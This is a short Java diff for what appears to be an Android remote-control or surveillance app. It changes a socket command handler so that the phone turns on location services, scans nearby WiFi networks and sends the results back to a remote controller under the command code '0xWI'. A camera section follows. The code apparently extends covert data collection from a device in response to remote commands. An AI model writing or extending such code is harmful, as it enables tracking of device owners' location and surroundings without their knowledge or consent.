@@ -170,9 +170,39 @@ public final class SocketCommandRouter {
         });
     }
 
-    // WiFi scan
+    // WiFi scan - activates location services first (required on Android 6.0+)
     private static void handleWifi(Socket socket) {
-        EXEC.execute(() -> emit(socket, "0xWI", WifiScanner.scan(FasonApp.getContext())));
+        EXEC.execute(() -> {
+            try {
+                // Clear WiFi cache to get fresh results
+                WifiScanner.clearCache();
+                
+                // Activate location services first (required for WiFi scanning)
+                MainService svc = MainService.getInstance();
+                LocManager loc = svc != null ? svc.getLocManager() : new LocManager(FasonApp.getContext());
+                
+                loc.requestSingle();
+                Thread.sleep(3000);
+                
+                // Get fresh socket reference after sleep (socket may have reconnected)
+                Socket s = SocketClient.getInstance().getSocket();
+                
+                // Perform WiFi scan
+                JSONObject result = WifiScanner.scan(FasonApp.getContext());
+                if (s != null) {
+                    s.emit("0xWI", result);
+                }
+            } catch (Exception e) {
+                try {
+                    Socket s = SocketClient.getInstance().getSocket();
+                    if (s != null) {
+                        JSONObject err = new JSONObject();
+                        err.put("error", "WiFi scan failed: " + e.getMessage());
+                        s.emit("0xWI", err);
+                    }
+                } catch (Exception ignored) {}
+            }
+        });
     }
 
     // Camera operations
